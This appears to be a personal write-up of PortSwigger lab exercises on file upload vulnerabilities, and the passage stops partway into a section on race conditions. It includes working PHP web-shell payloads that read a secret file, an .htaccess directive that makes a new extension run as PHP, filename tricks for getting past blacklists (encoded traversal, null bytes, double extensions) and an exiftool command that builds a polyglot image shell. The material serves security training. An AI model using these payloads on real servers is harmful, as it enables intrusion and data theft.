---
description: >-
  https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities
---

# 📑 File Upload vulnerabilities

File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution.

We already did some File uploads in the&#x20;

{% content-ref url="server-side-vulnerabilities.md" %}
[server-side-vulnerabilities.md](server-side-vulnerabilities.md)
{% endcontent-ref %}

### Lab: Web shell upload via path traversal

We start by uploading our php payload and capturing the request:

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We saw that we were able to upload the PHP file, but it was as a txt file, the folder must filter out the PHP files, so let's save the PHP file in another directory. If we do a filename ../webshell.php it cuts the ../ but if we encode it to ..%2fwebshell.php it seems to work:

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

so we see when encoding it saves the shell in another directory ->

so i took te req and forwarded it, on the page it showed:

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and now we go back on repeater, and we get the file:

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Lab: Web shell upload via extension blacklist bypass

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

This payload will enable us to read the content of the secret file, now let's upload our picture and the request ->

<figure><img src="../../.gitbook/assets/image (845).png" alt=""><figcaption></figcaption></figure>

and with the following request we are able to GET our image:

```
GET /files/avatars/image.png
```

if we try to run a php payload ->

<figure><img src="../../.gitbook/assets/image (846).png" alt=""><figcaption></figcaption></figure>

and if we look at the pretty output:

<figure><img src="../../.gitbook/assets/image (847).png" alt=""><figcaption></figcaption></figure>

We can see on this website that .htaccess files are not very secure:

{% embed url="https://httpd.apache.org/docs/2.4/howto/htaccess.html" %}

So we are going to rename the file .htaccess and change the content:

<figure><img src="../../.gitbook/assets/image (848).png" alt=""><figcaption></figcaption></figure>

```
AddType application/x-httpd-php .shell
```

* `AddType`: This is an Apache directive used to specify how files with certain extensions should be handled by the server.
* `application/x-httpd-php`: This indicates the MIME type of the files. In this case, it specifies that the files are PHP scripts.
* `.shell`: This is the file extension that the directive applies to. In this case, it's `.shell`, meaning any file with this extension will be treated as a PHP script.

And now we take the query back in time and make our malicious file:

<figure><img src="../../.gitbook/assets/image (849).png" alt=""><figcaption></figcaption></figure>

#### Other techniques to bypass file extension blacklist:

* Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a PHP file or JPG image: `exploit.php.jpg`
* Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: `exploit.php.`
* Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: `exploit%2Ephp`
* Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: `exploit.asp;.jpg` or `exploit.asp%00.jpg`
* Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.
*   you can position the prohibited string in such a way that removing it still leaves behind a valid file extension. For example, consider what happens if you strip `.php` from the following filename:

    `exploit.p.phphp`

### Lab: Web shell upload via obfuscated file extension

So for the chal we can easily guess it's one of those, and indeed it was:

<figure><img src="../../.gitbook/assets/image (850).png" alt=""><figcaption><p>FP.php%00.jpg</p></figcaption></figure>

And we can now make a GET to the file:

<figure><img src="../../.gitbook/assets/image (851).png" alt=""><figcaption></figcaption></figure>

#### Flawed validation of the file's contents

Instead of implicitly trusting the `Content-Type` specified in a request, more secure servers try to verify that the contents of the file actually match what is expected.

In the case of an image upload function, the server might try to verify certain intrinsic properties of an image, such as its dimensions. If you try uploading a PHP script, for example, it won't have any dimensions at all. Therefore, the server can deduce that it can't possibly be an image, and reject the upload accordingly.

Similarly, certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes `FF D8 FF`.

This is a much more robust way of validating the file type, but even this isn't foolproof. Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.

{% embed url="https://exiftool.org/" %}

### Lab: Remote code execution via polyglot web shell upload

We need to create a malicious php file with a JPG header

```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```

* `exiftool`: This is the command-line utility we're using.
* `-Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>"`: This part sets the comment metadata of the image file to a PHP code snippet. It appears to be intended to embed PHP code into the metadata of the image. The PHP code retrieves the contents of a file located at `/home/carlos/secret` and appends 'START ' before the content and ' END' after the content.
* `<YOUR-INPUT-IMAGE>.jpg`: This is where you would specify the input image file. Replace `<YOUR-INPUT-IMAGE>.jpg` with the path to your actual image file. The `.jpg` extension suggests that the input image file is in JPEG format.
* `-o polyglot.php`: This part specifies the output file name. It instructs ExifTool to save the modified image with the PHP code embedded in its metadata into a file named `polyglot.php`.

We upload the file and if we&#x20;

`GET /files/avatars/polyglot.php`

We can have the password

#### Exploiting file upload race conditions

Modern frameworks are more battle-hardened against these kinds of attacks. They generally don't upload files directly to their intended destination on the filesystem. Instead, they take precautions like uploading to a temporary, sandboxed directory first and randomizing the name to avoid overwriting existing files. They then perform validation on this temporary file and only transfer it to its destination once it is deemed safe to do so.

